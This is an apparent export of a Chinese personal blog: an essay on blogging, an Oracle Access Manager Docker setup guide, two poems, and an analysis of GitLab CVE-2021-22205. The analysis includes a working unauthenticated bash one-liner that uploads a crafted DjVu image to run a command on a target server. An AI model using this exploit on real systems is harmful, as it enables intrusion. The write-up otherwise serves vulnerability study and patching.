。\n这让我想起我父亲的父亲的死亡，算是我年少时的一道阴影和一次历练，我也为之也写过文，回头看那文矫饰太甚，可能是年轻的心很难有真正的绝望，只是些悲伤恐惧和无助的梦话罢了。爷爷的死亡已是七年多，2600多天前的事了，我在他离开后又经历了一些新的生活，我寻觅和游荡，工作和消费，见识繁华和落寞，走过哲学和姑娘，我过无数生活中的平凡一种，对于这无数死亡中的平凡一次，也的确是想起得越来越少。也许除了奶奶和父亲，也不会再有其他人想起爷爷。不好说可悲，我能理解，生命就是如此，但人总有奢望。人奢望明天会好，奢望会被爱，奢望能占有，奢望基因的传承，奢望模因的不朽。事实是明天会不同，但不会太不同，事实是人最爱自己，事实是人总能离开，事实是死亡不可避免。\nblog.metaphox.com 的作者爱恋自己的文字，使我有机会读到那个时候的作者在经历那些感受时的想法。仔细想想这很有意思。人很孤独，独自来到，独自行走，独自离开。人可能发出过一些声音，创造过一些东西，有过一些想法和感受，但在岁月呼啸和星海横流中，都不值一提，什么意义也谈不上。十七年的时光在宇宙面前犹如沧海一粟，但在人短暂的一生中却有一定分量。一个人的想法穿越十七年在另一个人心中掀起波澜，不能说这里面没有一点点的浪漫。而写博客，可能就是为了这一点点烂漫，不问下文地表达，没有什么目的，只是搅动这一塘混乱和生命而已。\n忽然想到，生命里遇到的任何值得的人，我们都应该好好珍惜，在星海横流里相遇，本是实实在在的烂漫。好过写博客这种虚无缥缈的烂漫。\nupdate@20230712 读到 https://byvoid.com/zhs/ 的博客，颇有感触，想将博客长久地运营下去。","title":"我为什么写博客？"},{"content":"大纲 参考 https://docs.oracle.com/en/middleware/idm/access-manager/12.2.1.4/tutorial-oam-docker/#Background 使用方法2获取OAM镜像\nDownload a prebuilt OAM image from Oracle Container Registry by by navigating to Middleware \u0026gt; oam. This image contains no patches and should only be used in Developer or Test environments. 下载到的OAM镜像用于跑起来三个OAM容器\nWebLogic Administration Server (AdminServer) OAM Managed Server (oam_server1) OAM Policy Manager Managed Server (oam_policy_mgr1) 跑起来这三个容器依赖一个可用的Oracle数据库\n步骤汇总 创建一台全新的Ubuntu18.04，切换到root用户。\n在 https://hub.docker.com/_/oracle-database-enterprise-edition 和 https://container-registry.oracle.com/ 登录账号后同意协议。（参考步骤二）\n安装docker\n1 2 apt update apt install docker.io docker 登录dockerhub 和 container-registry.oracle.com\n1 2 3 4 docker login 输入 login.docker.com 的账号密码\tdocker login container-registry.oracle.com 输入 login.oracle.com 的账号密码 拉取两个镜像\n1 2 docker pull store/oracle/database-enterprise:12.2.0.1 docker pull container-registry.oracle.com/middleware/oam:12.2.1.4.0 一些准备工作\n1 2 3 docker network create -d bridge OamNET mkdir -p /scratch/user_projects chmod 777 /scratch/user_projects 启动四个容器（将172.17.0.1替换为docker虚拟网卡网关的IP）\n1 2 3 4 docker run -d -it --name myOracleDB -p 1521:1521 store/oracle/database-enterprise:12.2.0.1 docker run -d --network=OamNET -p 7001:7001 --name=oamadmin --env CONNECTION_STRING=172.17.0.1:1521/ORCLPDB1.localdomain --env ADMIN_LISTEN_HOST=oamadmin --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_PORT=7001 --env RCUPREFIX=OAM1 --env DB_USER=sys --env DB_PASSWORD=Oradoc_db1 --env DB_SCHEMA_PASSWORD=Oradoc_db2 -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0 docker run -d -p 14100:14100 --network=OamNET --volumes-from oamadmin --name oamms --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_HOST=oamadmin --env ADMIN_LISTEN_PORT=7001 --env MANAGEDSERVER_PORT=14100 --env MANAGED_SERVER_CONTAINER=true --env MS_NAME=oam_server1 --env MS_HOST=oamms container-registry.oracle.com/middleware/oam:12.2.1.4.0 \u0026#34;/u01/oracle/dockertools/startMS.sh\u0026#34; docker run -d -p 15100:15100 --network=OamNET --volumes-from oamadmin --name oampolicy --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_HOST=oamadmin --env ADMIN_LISTEN_PORT=7001 --env MANAGEDSERVER_PORT=15100 --env MANAGED_SERVER_CONTAINER=true --env MS_NAME=oam_policy_mgr1 --env MS_HOST=oampolicy container-registry.oracle.com/middleware/oam:12.2.1.4.0 \u0026#34;/u01/oracle/dockertools/startMS.sh\u0026#34; 查看各服务IP\n1 docker inspect -f \u0026#39;{{.Name}} - {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}\u0026#39; oamadmin oamms oampolicy myOracleDB 使用以下链接访问服务。（192.168.0.105为虚拟机IP）\n1 2 3 4 5 6 7 账号：weblogic 密码：W3bl@gic WebLogic Administration Console http://192.168.0.105:7001/console Oracle Enterprise Manager Console http://192.168.0.105:7001/em Oracle Access Management Console http://192.168.0.105:7001/oamconsole OAM Server Logout http://192.168.0.105:14100/oam/server/logout Policy Manager Access http://192.168.0.105:15100/access ①运行Oracle数据库 创建Oracle数据库 参考 https://hub.docker.com/_/oracle-database-enterprise-edition 登陆账号后跳转到 https://hub.docker.com/u/findneo/content/sub-3762ef81-7448-4275-909b-df7e6b5d4070 ，同意协议。\n1 2 3 4 5 6 7 8 sudo docker login # 输入docker hub的账号密码 sudo docker pull store/oracle/database-enterprise:12.2.0.1 # 拉取镜像 sudo docker run -d -it --name myOracleDB -p 1521:1521 store/oracle/database-enterprise:12.2.0.1 # 运行起来一个Oracle数据库，并且开放到本地的1521端口 测试数据库连接 安装sqlplus 参考https://askubuntu.com/questions/159939/how-to-install-sqlplus\nstep1: 1 sudo apt-get install alien step2: 在 https://www.oracle.com/database/technologies/instant-client/linux-x86-64-downloads.html 下载3个文件 oracle-instantclient12.2-basic-12.2.0.1.0-1.x86_64.rpm oracle-instantclient12.2-sqlplus-12.2.0.1.0-1.x86_64.rpm oracle-instantclient12.2-devel-12.2.0.1.0-1.x86_64.rpm\nstep3: 1 2 3 sudo alien -i oracle-instantclient*-basic*.rpm sudo alien -i oracle-instantclient*-sqlplus*.rpm sudo alien -i oracle-instantclient*-devel*.rpm step4: sudo apt-get install libaio1\nstep5: 1 2 sudo sensible-editor /etc/ld.so.conf.d/oracle.conf # 粘贴 /usr/lib/oracle/12.2/client64/lib/ step6: sudo ldconfig\nstep7 测试链接 1 2 sqlplus64 sys/Oradoc_db1@//127.0.0.1:1521/ORCLCDB.localdomain as sysdba sqlplus64 sys/Oradoc_db1@//172.17.0.1:1521/ORCLPDB1.localdomain as sysdba 其他：sqlplus64的用法 sqlplus64的用法：sqlplus [ [\u0026lt;option\u0026gt;] [{logon | /nolog}] [\u0026lt;start\u0026gt;] ]\n其中\u0026lt;logon\u0026gt; 是\n1 {\u0026lt;username\u0026gt;[/\u0026lt;password\u0026gt;][@\u0026lt;connect_identifier\u0026gt;] | / } [AS {SYSDBA | SYSOPER | SYSASM | SYSBACKUP | SYSDG | SYSKM | SYSRAC}] [EDITION=value] 其中\u0026lt;connect_identifier\u0026gt;可以是如下格式 @[\u0026lt;net_service_name\u0026gt; | [//]Host[:Port]/\u0026lt;service_name\u0026gt;]\n如何知道 service_name 或者 net_service_name？Oracle数据库容器镜像文档说service_name定义在环境变量TNS_ADMIN定义的目录下的tnsnames.ora文件中， 进容器看到 TNS_ADMIN=/u01/app/oracle/product/12.2.0/dbhome_1/admin/ORCLCDB ，tnsnames.ora文件内容为\n1 2 ORCLCDB = (DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = 0.0.0.0)(PORT = 1521)) (CONNECT_DATA = (SERVER = DEDICATED) (SERVICE_NAME = ORCLCDB.localdomain) ) ) ORCLPDB1 = (DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = 0.0.0.0)(PORT = 1521)) (CONNECT_DATA = (SERVER = DEDICATED) (SERVICE_NAME = ORCLPDB1.localdomain) ) ) 所以 SERVICE_NAME 可以是 ORCLCDB.localdomain 或者 ORCLPDB1.localdomain 。\n②下载OAM镜像 进入 https://container-registry.oracle.com/ ，点击右上角Sign In，登陆自己的Oracle账号，然后点击MiddleWare，然后点击OAM。\n在右侧区域同意协议，然后才可以下载。\n否则即使docker login，还是无法下载，会提示\nError response from daemon: pull access denied for container-registry.oracle.com/middleware/oam, repository does not exist or may require \u0026lsquo;docker login\u0026rsquo;: denied: requested access to the resource is denied。\n同意协议之后执行以下命令\n1 sudo docker login container-registry.oracle.com 输入在Oracle注册的账号密码\n1 sudo docker pull container-registry.oracle.com/middleware/oam:12.2.1.4.0 ③创建容器一 参考教程创建OAM Administration Server Container，其中包含WebLogic 和OAM Consoles.\n1 2 3 4 5 6 7 8 sudo docker images sudo docker network create -d bridge OamNET # 14f104a67b0819335f9490dadc3e4003540bcdbb7b19436b2aea56250a5f2713 sudo mkdir -p /scratch/user_projects sudo chmod 777 /scratch/user_projects sudo docker run -d --network=OamNET -p 7001:7001 --name=oamadmin --env CONNECTION_STRING=127.0.0.1:1521/ORCLCDB.localdomain --env ADMIN_LISTEN_HOST=oamadmin --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=password --env ADMIN_LISTEN_PORT=7001 --env RCUPREFIX=OAM1 --env DB_USER=sys --env DB_PASSWORD=Oradoc_db1 --env DB_SCHEMA_PASSWORD=password -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0 可能会连不上，使用以下命令调试，看看错误是什么\n1 sudo docker run --rm --network=OamNET -p 7001:7001 --name=oamadmin --env CONNECTION_STRING=127.0.0.1:1521/ORCLCDB.localdomain --env ADMIN_LISTEN_HOST=oamadmin --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=password --env ADMIN_LISTEN_PORT=7001 --env RCUPREFIX=OAM1 --env DB_USER=sys --env DB_PASSWORD=Oradoc_db1 --env DB_SCHEMA_PASSWORD=password -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0 报错及解决 报错一：无法连接数据库 1 2 Unable to connect to the database using the provided details. Enter a valid hostname and port or check if the listener is up and running 解决一：使用正确的IP 需要注意CONNECTION_STRING是从新建的容器中访问的，所以给的IP应该是容器网卡的网关或者主机的，比如 172.17.0.1，而不是127.0.0.1。\n报错二：无法连接CDB 1 The selected Oracle database is a multitenant container database (CDB). Connecting to a multitenant container database (CDB) is not supported. Instead, connect to a valid pluggable database (PDB). 解决二：使用PDB PDB和CDB是Oracle12的新特性，CDB是多租的。Oracle 数据库 12 c 多租户选项允许单个容器数据库 （CDB） 来承载多个单独的可插拔数据库 (PDB)。\n——https://www.cnblogs.com/kerrycode/p/3386917.html\n使用以下语句查看自己是否是所租数据库\n1 select name, decode(cdb, \u0026#39;YES\u0026#39;, \u0026#39;Multitenant Option enabled\u0026#39;, \u0026#39;Regular 12c Database: \u0026#39;) \u0026#34;Multitenant Option\u0026#34; , open_mode, con_id from v$database; 结果\n1 2 3 NAME Multitenant Option OPEN_MODE CON_ID --------- -------------------------- -------------------- ---------- ORCLCDB Multitenant Option enabled READ WRITE 0 或者直接\n1 select cdb from v$database YES表示该数据库是CDB,如果是NO表示是NO-CDB(普通数据库)\n或者执行\n1 show pdbs; 结果\n1 2 3 CON_ID CON_NAME OPEN MODE RESTRICTED ---------- ------------------------------ ---------- ---------- 2 PDB$SEED READ ONLY NO 搜索 \u0026ldquo;how to connect to pdb directly\u0026rdquo; ，参考此文 想到通过新建服务连接到PDB。然后注意到/u01/app/oracle/product/12.2.0/dbhome_1/admin/ORCLCDB/tnsnames.ora 文件内容如下，其中已经包括两个Service。\n1 2 ORCLCDB = (DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = 0.0.0.0)(PORT = 1521)) (CONNECT_DATA = (SERVER = DEDICATED) (SERVICE_NAME = ORCLCDB.localdomain) ) ) ORCLPDB1 = (DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = 0.0.0.0)(PORT = 1521)) (CONNECT_DATA = (SERVER = DEDICATED) (SERVICE_NAME = ORCLPDB1.localdomain) ) ) 所以只要，创建容器时CONNECTION_STRING 使用 172.17.0.1:1521/ORCLPDB1.localdomain 而不是 172.17.0.1:1521/ORCLCDB.localdomain 就能解决这个错误。\n报错三：无法执行SQL 1 2 3 ERROR - RCU-6005 Unable to execute sql query. CAUSE - RCU-6005 Database not in open state. ACTION - RCU-6005 Make sure that the database is open. 解决三：打开PDB 为了解决报错二胡乱操作了数据库，其中一个动作关闭了PDB，从而导致了这个错误。打开它就好了。\nSQL\u0026gt; select name,open_mode from v$pdbs;\n1 2 3 4 5 6 NAME -------------------------------------------------------------------------------- OPEN_MODE ---------- ORCLPDB1 MOUNTED SQL\u0026gt; alter pluggable database ORCLPDB1 open;\n1 Pluggable database altered. SQL\u0026gt; select name,open_mode from v$pdbs;\n1 2 3 4 5 6 NAME -------------------------------------------------------------------------------- OPEN_MODE ---------- ORCLPDB1 READ WRITE 报错四：创建domain失败 日志详情：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 CONNECTION_STRING=172.17.0.1:1521/ORCLPDB1.localdomain RCUPREFIX=OAM1 DOMAIN_HOME=/u01/oracle/user_projects/domains/access_domain INFO: Admin Server not configured. Will run RCU and Domain Configuration Phase... Configuring Domain for first time Start the Admin and Managed Servers ===================================== Loading RCU Phase ================= CONNECTION_STRING=172.17.0.1:1521/ORCLPDB1.localdomain RCUPREFIX=OAM1 jdbc_url=jdbc:oracle:thin:@172.17.0.1:1521/ORCLPDB1.localdomain Creating Domain 1st execution Loading RCU into database with RCUPREFIX OAM1 Domain Configuration Phase ========================== /u01/oracle/oracle_common/common/bin/wlst.sh -skipWLSModuleScanning /u01/oracle/dockertools/create_domain.py -oh /u01/oracle -jh /u01/jdk -parent /u01/oracle/user_projects/domains -name access_domain -user weblogic -password password -rcuDb 172.17.0.1:1521/ORCLPDB1.localdomain -rcuPrefix OAM1 -rcuSchemaPwd password -isSSLEnabled true Cmd is /u01/oracle/oracle_common/common/bin/wlst.sh -skipWLSModuleScanning /u01/oracle/dockertools/create_domain.py -oh /u01/oracle -jh /u01/jdk -parent /u01/oracle/user_projects/domains -name access_domain -user weblogic -password password -rcuDb 172.17.0.1:1521/ORCLPDB1.localdomain -rcuPrefix OAM1 -rcuSchemaPwd password -isSSLEnabled true Initializing WebLogic Scripting Tool (WLST) ... Welcome to WebLogic Server Administration Scripting Shell Type help() for help on available commands create_domain.py called with the following inputs: INFO: sys.argv[0] = /u01/oracle/dockertools/create_domain.py INFO: sys.argv[1] = -oh INFO: sys.argv[2] = /u01/oracle INFO: sys.argv[3] = -jh INFO: sys.argv[4] = /u01/jdk INFO: sys.argv[5] = -parent INFO: sys.argv[6] = /u01/oracle/user_projects/domains INFO: sys.argv[7] = -name INFO: sys.argv[8] = access_domain INFO: sys.argv[9] = -user INFO: sys.argv[10] = weblogic INFO: sys.argv[11] = -password INFO: sys.argv[12] = password INFO: sys.argv[13] = -rcuDb INFO: sys.argv[14] = 172.17.0.1:1521/ORCLPDB1.localdomain INFO: sys.argv[15] = -rcuPrefix INFO: sys.argv[16] = OAM1 INFO: sys.argv[17] = -rcuSchemaPwd INFO: sys.argv[18] = password INFO: sys.argv[19] = -isSSLEnabled INFO: sys.argv[20] = true INFO: Creating Admin server... INFO: Enabling SSL PORT for AdminServer... Error: set() failed. Do dumpStack() to see details. Error: runCmd() failed. Do dumpStack() to see details. Problem invoking WLST - Traceback (innermost last): File \u0026#34;/u01/oracle/dockertools/create_domain.py\u0026#34;, line 513, in ? File \u0026#34;/u01/oracle/dockertools/create_domain.py\u0026#34;, line 123, in createOAMDomain File \u0026#34;/u01/oracle/dockertools/create_domain.py\u0026#34;, line 184, in createBaseDomain File \u0026#34;/tmp/WLSTOfflineIni5785928536971827845.py\u0026#34;, line 79, in set File \u0026#34;/tmp/WLSTOfflineIni5785928536971827845.py\u0026#34;, line 19, in command at com.oracle.cie.domain.script.jython.CommandExceptionHandler.handleException(CommandExceptionHandler.java:69) at com.oracle.cie.domain.script.jython.WLScriptContext.handleException(WLScriptContext.java:3085) at com.oracle.cie.domain.script.jython.WLScriptContext.runCmd(WLScriptContext.java:738) at sun.reflect.GeneratedMethodAccessor132.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) com.oracle.cie.domain.script.jython.WLSTException: com.oracle.cie.domain.script.jython.WLSTException Domain Creation Failed.. Please check the Domain Logs 可以从48行看到是在 Creating Admin server... 阶段出错的。\n解决四：提高ADMIN_PASSWORD 密码复杂度 需要注意的是每次失败重试之前要先删除之前留下的痕迹。\n1 2 sudo docker rm oamadmin sudo rm -rf /scratch/user_projects/* 从这里 https://github.com/oracle/docker-images/issues/844#issuecomment-389884511 看到可能是密码复杂度不够，导致无法设置密码。\n启动容器的命令改为以下。将其中 ADMIN_PASSWORD 和 DB_SCHEMA_PASSWORD 的复杂度变高。\n其中ADMIN_PASSWORD 应该是weblogic管理台的密码。DB_SCHEMA_PASSWORD 是 password you want to set for the RCU schemas 。\n那么什么是RCU schemas 呢？什么是RCU呢？不太理解，先跳过。\nRepository Creation Utility is a graphical and CLI-based tool used to create and manage Oracle Fusion Middleware database schemas.\n改进两个密码的复杂度重新创建容器。\n1 sudo docker run -d --network=OamNET -p 7001:7001 --name=oamadmin --env CONNECTION_STRING=172.17.0.1:1521/ORCLPDB1.localdomain --env ADMIN_LISTEN_HOST=oamadmin --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_PORT=7001 --env RCUPREFIX=OAM1 --env DB_USER=sys --env DB_PASSWORD=Oradoc_db1 --env DB_SCHEMA_PASSWORD=Dbsch3m@ -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0 并使用 sudo docker logs -ft oamadmin 查看新建过程打印出来的日志，看到问题得到了解决。\n报错五：创建domain失败 可以看到前几个步骤都顺利完成了，但也出现了新的问题。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 类似前文日志 INFO: Creating Admin server... INFO: Enabling SSL PORT for AdminServer... Creating Node Managers... Will create Base domain at /u01/oracle/user_projects/domains/access_domain Writing base domain... Base domain created at /u01/oracle/user_projects/domains/access_domain Extending domain at /u01/oracle/user_projects/domains/access_domain Database 172.17.0.1:1521/ORCLPDB1.localdomain Apply Extension templates Extension Templates added Extension Templates added Deleting oam_server1 The default oam_server1 coming from the oam extension template deleted Deleting oam_policy_mgr1 The default oam_server1 coming from the oam extension template deleted Configuring JDBC Templates ... Configuring the Service Table DataSource... fmwDatabase jdbc:oracle:thin:@172.17.0.1:1521/ORCLPDB1.localdomain Getting Database Defaults... Error: getDatabaseDefaults() failed. Do dumpStack() to see details. Error: runCmd() failed. Do dumpStack() to see details. Problem invoking WLST - Traceback (innermost last): File \u0026#34;/u01/oracle/dockertools/create_domain.py\u0026#34;, line 513, in ? File \u0026#34;/u01/oracle/dockertools/create_domain.py\u0026#34;, line 124, in createOAMDomain File \u0026#34;/u01/oracle/dockertools/create_domain.py\u0026#34;, line 328, in extendOamDomain File \u0026#34;/u01/oracle/dockertools/create_domain.py\u0026#34;, line 259, in configureJDBCTemplates File \u0026#34;/tmp/WLSTOfflineIni7074819690261705056.py\u0026#34;, line 267, in getDatabaseDefaults File \u0026#34;/tmp/WLSTOfflineIni7074819690261705056.py\u0026#34;, line 19, in command Failed to build JDBC Connection object: at com.oracle.cie.domain.script.jython.CommandExceptionHandler.handleException(CommandExceptionHandler.java:69) at com.oracle.cie.domain.script.jython.WLScriptContext.handleException(WLScriptContext.java:3085) at com.oracle.cie.domain.script.jython.WLScriptContext.runCmd(WLScriptContext.java:738) at sun.reflect.GeneratedMethodAccessor132.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) com.oracle.cie.domain.script.jython.WLSTException: com.oracle.cie.domain.script.jython.WLSTException: Got exception when auto configuring the schema component(s) with data obtained from shadow table: Failed to build JDBC Connection object: Domain Creation Failed.. Please check the Domain Logs 解决五：修改DB_SCHEMA_PASSWORD 从日志看到是在 Getting Database Defaults... 阶段出现的问题，搜索 getDatabaseDefaults() failed. Do dumpStack() to see details. 发现这个github issue有讨论。\n看到有人说是 schema password 的问题，于是随便改DB_SCHEMA_PASSWORD ，改成Oradoc_db1 还是不行，改成Oradoc_db2就可以了，我也不知道是什么原因😓\n总之呢，用这个命令，就可以跑起来三个容器中的第一个了！\n1 sudo docker run -d --network=OamNET -p 7001:7001 --name=oamadmin --env CONNECTION_STRING=172.17.0.1:1521/ORCLPDB1.localdomain --env ADMIN_LISTEN_HOST=oamadmin --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_PORT=7001 --env RCUPREFIX=OAM1 --env DB_USER=sys --env DB_PASSWORD=Oradoc_db1 --env DB_SCHEMA_PASSWORD=Oradoc_db2 -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0 成果 ④创建容器二 1 sudo docker run -d -p 14100:14100 --network=OamNET --volumes-from oamadmin --name oamms --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_HOST=oamadmin --env ADMIN_LISTEN_PORT=7001 --env MANAGEDSERVER_PORT=14100 --env MANAGED_SERVER_CONTAINER=true --env MS_NAME=oam_server1 --env MS_HOST=oamms container-registry.oracle.com/middleware/oam:12.2.1.4.0 \u0026#34;/u01/oracle/dockertools/startMS.sh\u0026#34; ⑤创建容器三 1 sudo docker run -d -p 15100:15100 --network=OamNET --volumes-from oamadmin --name oampolicy --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_HOST=oamadmin --env ADMIN_LISTEN_PORT=7001 --env MANAGEDSERVER_PORT=15100 --env MANAGED_SERVER_CONTAINER=true --env MS_NAME=oam_policy_mgr1 --env MS_HOST=oampolicy container-registry.oracle.com/middleware/oam:12.2.1.4.0 \u0026#34;/u01/oracle/dockertools/startMS.sh\u0026#34; ⑥验证服务可用性 1 sudo docker inspect -f \u0026#39;{{.Name}} - {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}\u0026#39; oamadmin oamms oampolicy myOracleDB Console or Page URL WebLogic Administration Console http://\u0026lt;oamadmin_ip\u0026gt;:7001/console Oracle Enterprise Manager Console http://\u0026lt;oamadmin_ip\u0026gt;:7001/em Oracle Access Management Console http://\u0026lt;oamadmin_ip\u0026gt;:7001/oamconsole OAM Server Logout http://\u0026lt;oamms_ip\u0026gt;:14100/oam/server/logout Policy Manager Access http://\u0026lt;oampolicy_ip\u0026gt;:15100/access 各服务截图\n⑦启停与删除 启停\n1 2 sudo docker stop oamadmin oamms oampolicy myOracleDB sudo docker start oamadmin oamms oampolicy myOracleDB 删除\n1 2 3 sudo docker stop oamadmin oamms oampolicy myOracleDB sudo docker rm oamadmin oamms oampolicy myOracleDB sudo rm -rf /scratch/user_projects 参考链接 安装Oracle Access Manager Creating Oracle Access Management Docker Containers https://www.oracle.com/hk/security/identity-management/technologies/downloads/ https://docs.oracle.com/cd/E23104_01/download_readme.htm https://github.com/oracle/docker-images/tree/main/OracleAccessManagement CDB与PDB ORACLE 12C新特性——CDB与PDB 如何连接到 Oracle RAC 12cR1 中的可插拔数据库？ SQLPLus How to install SqlPlus? Oracle Instant Client Downloads for Linux x86-64 (64-bit) Oracle数据库 Oracle Database Server Docker Image Documentation 漏洞分析 【最新漏洞预警】CVE-2021–35587 Oracle Access Manager反序列化漏洞分析与命令回显构造 ","permalink":"https://ret2neo.cn/post/220317-howto-install-oracle-access-manager/","summary":"大纲 参考 https://docs.oracle.com/en/middleware/idm/access-manager/12.2.1.4/tutorial-oam-docker/#Background 使用方法2获取OAM镜像\nDownload a prebuilt OAM image from Oracle Container Registry by by navigating to Middleware \u0026gt; oam. This image contains no patches and should only be used in Developer or Test environments. 下载到的OAM镜像用于跑起来三个OAM容器\nWebLogic Administration Server (AdminServer) OAM Managed Server (oam_server1) OAM Policy Manager Managed Server (oam_policy_mgr1) 跑起来这三个容器依赖一个可用的Oracle数据库\n步骤汇总 创建一台全新的Ubuntu18.04，切换到root用户。\n在 https://hub.docker.com/_/oracle-database-enterprise-edition 和 https://container-registry.oracle.com/ 登录账号后同意协议。（参考步骤二）\n安装docker\n1 2 apt update apt install docker.io docker 登录dockerhub 和 container-registry.oracle.com","title":"如何搭建 Oracle Access Manager"},{"content":"告别总是悄无声息。\n阳光温暖，笑意迷人。\n我们说着再见，但没再见。\n","permalink":"https://ret2neo.cn/mind/211205-silent-break/","summary":"告别总是悄无声息。\n阳光温暖，笑意迷人。\n我们说着再见，但没再见。","title":"告别总是悄无声息"},{"content":" 感谢遇见\n相逢还不错\n但实话实说\n我啥也没学会\n还浪费很多时间\n说喜欢总是很容易\n吃过饭不妨看个电影\n依然不知道如何去爱\n也始终没觉得义无反顾\n诚实说电影还喜独身看\n因人前我不全是自己\n真我沮丧无聊不言语\n只会长街巷陌徘徊\n同古今庸众郁郁\n怅寥廓叹空有\n这世上快乐\n没采得几分\n没法匀你\n","permalink":"https://ret2neo.cn/mind/211125-goodday/","summary":"感谢遇见\n相逢还不错\n但实话实说\n我啥也没学会\n还浪费很多时间\n说喜欢总是很容易\n吃过饭不妨看个电影\n依然不知道如何去爱\n也始终没觉得义无反顾\n诚实说电影还喜独身看\n因人前我不全是自己\n真我沮丧无聊不言语\n只会长街巷陌徘徊\n同古今庸众郁郁\n怅寥廓叹空有\n这世上快乐\n没采得几分\n没法匀你","title":"好日子"},{"content":"概况 Remote code execution when uploading specially crafted image files\nAn issue has been discovered in GitLab CE/EE affecting all versions starting from 11.9. GitLab was not properly validating image files that is passed to a file parser which resulted in a remote command execution. This is a critical severity issue (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H, 9.9). It is now mitigated in the latest release and is assigned CVE-2021-22205.\nThanks vakzz for reporting this vulnerability through our HackerOne bug bounty program.\nRemediation\nWe strongly recommend that all installations running an affected version above are upgraded to the latest version as soon as possible.\n——https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/#Remote-code-execution-when-uploading-specially-crafted-image-files\n时间线：\n1 2 3 4 2021/3/15 vakzz向hackerone报告漏洞 2021/4/14 GitLab发布更新release 2021/5/14 hackerone公布原始漏洞报告 2021/10/25 HN Security发布在野漏洞利用分析的博文，简化了漏洞利用方式 利用 GitLab在release log中给这个漏洞打分9.9 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)，认为是需要权限的。\n但在对在野利用的事件分析中，HN Security团队发现一种比入侵事件中更简化的无需认证的利用方式。\n所以CVE-2021-22205是一个CVSS 10分的无认证RCE，利用容易，危害高。\n网络上已有利用脚本，我也根据原始报告写了一个bash版本，一行代码就能利用。\n1 t=\u0026#34;http://vuln.site\u0026#34;;cmd=\u0026#39;touch /tmp/cve-2021-22205-proof\u0026#39;;f=\u0026#34;1.jpg\u0026#34;;echo 41542654464f524d000003af444a564d4449524d0000002e81000200000046000000acffffdebf992021c8914eeb0c071fd2da88e86be6440f2c7102ee49d36e95bda2c3223f464f524d0000005e444a5655494e464f0000000a00080008180064001600494e434c0000000f7368617265645f616e6e6f2e696666004247343400000011004a0102000800088ae6e1b137d97f2a89004247343400000004010ff99f4247343400000002020a464f524d00000307444a5649414e546100000150286d657461646174610a0928436f7079726967687420225c0a22202e2071787b|xxd -p -r\u0026gt;$f;echo -n $cmd\u0026gt;\u0026gt;$f;echo 7d202e205c0a|xxd -p -r\u0026gt;\u0026gt;$f;curl -b c -c c -XPOST $t/uploads/user -H \u0026#34;X-CSRF-Token: $(curl -b c -c c -s \u0026#34;$t/users/sign_in\u0026#34; |grep -Po \u0026#39;(?\u0026lt;=csrf-token\u0026#34; content=\u0026#34;)([^\u0026#34;]*)\u0026#39;)\u0026#34; -F \u0026#34;file=@$f\u0026#34; 注意点：\n并非只有/uploads/user 端点受影响，所有上传图片的点都可能成为攻击的入口，比如在野利用分析报告中用的就是新建一个issue然后访问/user/project/uploads。\n所以，在缓解漏洞时不能仅考虑从路由上禁止。\n原理 GitLab中用来处理上传文件的组件叫gitlab-workhorse，gitlab-workhorse使用开源工具ExifTool来抹除上传的图片中的元数据，ExifTool在解析DjVu格式时存在漏洞，会执行注入的perl脚本。\n存在漏洞的代码（https://github.com/exiftool/exiftool/blob/11.70/lib/Image/ExifTool/DjVu.pm#L233）\n1 2 3 4 # must protect unescaped \u0026#34;$\u0026#34; and \u0026#34;@\u0026#34; symbols, and \u0026#34;\\\u0026#34; at end of string $tok =~ s{\\\\(.)|([\\$\\@]|\\\\$)}{\u0026#39;\\\\\u0026#39;.($2 || $1)}sge; # convert C escape sequences (allowed in quoted text) $tok = eval qq{\u0026#34;$tok\u0026#34;}; # here!!! （截图源自在野利用分析文章）\n这里只是overview，有空了仔细分析整个调用流程。\n修复 参考 